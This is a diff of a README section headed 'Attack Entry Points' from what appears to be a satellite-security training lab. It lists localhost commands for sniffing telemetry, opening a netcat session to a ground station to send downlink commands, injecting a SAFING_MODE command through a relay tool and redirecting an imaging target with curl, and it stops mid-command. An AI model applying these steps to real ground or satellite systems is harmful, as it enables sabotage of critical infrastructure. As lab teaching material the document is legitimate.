@@ -79,16 +79,17 @@ Five objectives. They build on each other.
 ## Attack Entry Points
 
 ```bash
-# 1. Subscribe to TLM — no auth needed
-python3 lab/tools/signal_sniffer.py --ws ws://localhost:8765
+# 1. Check MOC status (no auth required)
+python3 lab/tools/telemetry_decoder.py --mode status
 
 # 2. Connect to GS-BETA — maintenance mode, no password
 nc localhost 4820
 > LISTCMDS
 > SENDCMD SpaceVE-1A DOWNLINK_ENABLE
+> SENDCMD SpaceVE-1A MISSION_DOWNLINK_ENABLE
 
-# 3. Forge and send CCSDS directly to satellite
-python3 lab/tools/ccsds_packet_forge.py --sat SpaceVE-1A --cmd SAFING_MODE --send
+# 3. Inject commands via the ground station relay tool
+python3 lab/tools/command_injector.py --attack gs_relay --cmd SAFING_MODE
 
 # 4. Redirect imaging target (no auth)
 curl -s -X POST http://localhost:8080/api/imagery/redirect \
